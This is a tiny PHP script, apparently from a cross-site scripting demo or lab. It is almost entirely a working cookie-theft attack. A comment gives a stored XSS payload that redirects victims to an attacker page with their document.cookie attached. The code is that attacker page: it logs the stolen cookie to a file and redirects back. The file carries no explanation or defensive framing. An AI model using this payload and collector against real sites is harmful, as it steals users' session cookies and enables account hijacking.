<?php

/*
In database :
<script>document.location = "http://0.0.0.0:8080/xss-attacker.php?cookie=" + document.cookie</script>
*/

$cookie = $_GET['cookie'];
file_put_contents(__DIR__ . '/log.txt', $cookie);
header('Location: xss.php');
